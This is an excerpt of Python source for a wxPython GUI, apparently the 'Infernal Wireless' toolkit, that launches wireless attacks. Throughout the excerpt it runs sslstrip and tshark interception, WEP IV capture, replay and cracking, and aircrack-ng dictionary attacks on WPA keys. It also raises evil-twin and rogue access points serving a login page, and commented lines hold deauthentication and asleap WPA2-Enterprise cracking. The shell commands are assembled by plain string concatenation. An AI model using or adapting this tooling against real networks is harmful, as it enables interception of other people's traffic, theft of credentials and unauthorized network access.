...
class Example(wx.Frame):
    ...
    def InitUI(self):
        ...
        db_log = logmenu.Append(-1, "Infernal Wireless Log", "Inferral Wireless Log")
...
'''
    ...
    def sslStrip(self, e):
        try:
            ...
            os.system("gnome-terminal -- sslstrip -akf --write=./Modules/Logs/sslstrip.log")
        except:
    ...
    def tshark_capture(self, e):
        os.system("gnome-terminal -- tshark -i any -f 'tcp port 80 or tcp port 443' -V -w ./Modules/TsharkCapture/tshark_capture_$(date +'%m_%d_%Y').cap &")
    ...
    def configure(self, e):
        try:
            ...
            os.system("apt-get install -y hostapd dnsmasq > /dev/null&")
            os.system("echo '##### hostapd and dnsmasq installed #####'")
            os.system("apt-get install -y wireless-tools iw wvdial > /dev/null&")
            os.system("echo '##### wireless-tools iw wvdial tools installed ##### '")
            os.system("apt-get install bridge-utils > /dev/null&")
            os.system("echo '##### bridge-utils installed ##### '")
            os.system("pip install reportlab > /dev/null&")
            os.system("echo '##### reportlab installed ##### '")
            os.system("apt-get install bridge-utils > /dev/null&")
            os.system("echo '##### bridge-utils installed ##### '")
            os.system("python ./Modules/airgraph-ng/setup.py build > /dev/null&")
            os.system("python ./Modules/airgraph-ng/setup.py install > /dev/null&")
            os.system("echo '##### air-graph installed ##### '")
            os.system('sh Modules/install_freeradius.sh')
            os.system("echo '##### Free Radius Installed ####'")
    ...
    # ~ print "gnome-terminal -- aireplay-ng -0 10 -e "+ssid+" "+mon_iface+" --ignore-negative-one &"

    # ~ os.system("gnome-terminal -- aireplay-ng -0 "+packet_count+" -e "+ssid+" "+mon_iface+" --ignore-negative-one")
    # ~
    ...
    # ~ hostapd.close()
    # ~ os.system("gnome-terminal -- hostapd ./Modules/hostapd-freenet.conf &")
    ...
    def wireless_scan(self, e):
        ...
        try:
            ...
            wireless_ssid_file = open('./Modules/Logs/sniffer/wScan.log', 'w')
    ...
    def captureIV(self, e):
        ...
        os.system("gnome-terminal -- airodump-ng " + mon_iface + " &")
        ...
        os.system("gnome-terminal -- airodump-ng -c 9 --bssid " + ask_mac + " -w output " + mon_iface + " &")
    ...
    def fakeAPauth(self, e):
        ...
        os.system(
            "gnome-terminal -- aireplay-ng -1 0 -e " + ssid + " -a " + ask_mac + " -h " + host_mac + " " + mon_iface + " &")
    ...
    def wep_replay(self, e):
        try:
            ...
            os.system(
                "gnome-terminal -- aireplay-ng -3 -b " + ask_mac + " -h " + host_mac + " " + monitoring_interface + " &")
        except:
            wx.MessageBox('Something went wrong', 'Warning', wx.ICON_INFORMATION)

    def wep_crack(self, e):

        os.system("gnome-terminal -- aircrack-ng -b " + captureIV.target_mac + " output*.cap &")
        os.system("gnome-terminal -- aircrack-ng -K -b " + captureIV.target_mac + " output*.cap &")
...
""" % (iface, SSID)
        ...
        #		#~ os.system("gnome-terminal -- tail -f /usr/local/var/log/radius/freeradius-server-wpe.log &")
...
class wpa_cracker(wx.Frame):
    ...
    def openfile(self, event):
        ...
        if dlg.ShowModal() == wx.ID_OK:
            ...
            # os.system("gnome-terminal -- aircrack-ng -w "+str(path)+" captures/*.cap -l captures/key_found.txt")
            self.capturelist = str(path)
            dlg.Destroy()

    def bruteforce(self, event):

        # ~ os.system("gnome-terminal -- aircrack-ng -w "+self.wordlist+" "+self.capturelist+" -l captures/key_found.txt")
        print self.wordlist
        ...
        test = subprocess.Popen(
            ["aircrack-ng", self.capturelist, "-w", self.wordlist, "-e", str(mySSID.GetValue()), "-l", "./Modules/capture/key_found.txt"],
        ...
        if 'Passphrase not in dictionary ' in output:
            ...
            passkey = open('./Modules/capture/key_found.txt', 'r').read()
...
class wpa2enterprise_cracker(wx.Frame):
    ...
    def bruteforce(self, event):
        ...
        # ~ os.system("gnome-terminal -- asleap -C "+self.g_challenge+" -R "+self.g_response+" -W "+self.wordlist+ " read")
        try:
...
class EvilWindow(wx.Frame):
    ...
    def ScanW(self, event):
        with open('./Modules/Logs/sniffer/wScan.log') as f:
            for i in f:
    ...
    def evil_twin_attack(self, SSID):
        ...
        hostapd.write(config_file)
        hostapd.close()
        os.system("gnome-terminal -- hostapd hostapd-evil.conf &")
...
""")
    ...
    def attack_W(self, e):
        ...
        self.Show(False)
        open('./Modules/Logs/sniffer/wScan.log', 'w').close()
...
class WPA2_crack(wx.Frame):
    def __init__(self, parent, id):
        ...
        select = wx.Button(btnPanel, -1, 'Select SSID', size=(100, 30))
        attack = wx.Button(btnPanel, -1, 'Attack', size=(100, 30))
        #brutePSK = wx.Button(btnPanel, -1, 'Crack Key', size=(100, 30))

        self.Bind(wx.EVT_BUTTON, self.wireless_scan, id=-1)

        attack.Bind(wx.EVT_BUTTON, self.attack_WPA2)

        #brutePSK.Bind(wx.EVT_BUTTON, self.wp2a_cracker)
        #self.Bind(wx.EVT_MENU, self.wp2_cracker, WPA2crack)
    ...
    def wireless_scan(self, event):
        ...
        try:
            if str(self.nDeviceList.GetValue()) != '':
                ...
                iw_scan_file = open('./Modules/Logs/sniffer/wScan.log', 'w')
                for iw_net in iw_nets:
                    text = ('[SSID: %(SSID)s, BSS: %(BSS)s, Ciphers: %(ciphers)s, Channel: %(channel)s]\n'
                            % iw_net)
    ...
    def wpa_crack_key(self, SSID, channel):
        ...
        # ~ os.system("gnome-terminal -- airodump-ng --essid "+SSID+" --write capture/"+SSID+"_crack mon0")
        os.system(command)
    ...
    def attack_WPA2(self, e):
        ...
        # ~ os.system("gnome-terminal -- aircrack-ng -w /usr/share/wordlists/fern-wifi/common.txt *.cap")
...
class infernal_wireless(wx.Frame):
    ...
    def executeInfernal(self, e):
        ...
        def get_login_page():
            ...
            hostapd.write(config_file)
            hostapd.close()
            os.system("gnome-terminal -- hostapd infernal-hostapd.conf &")
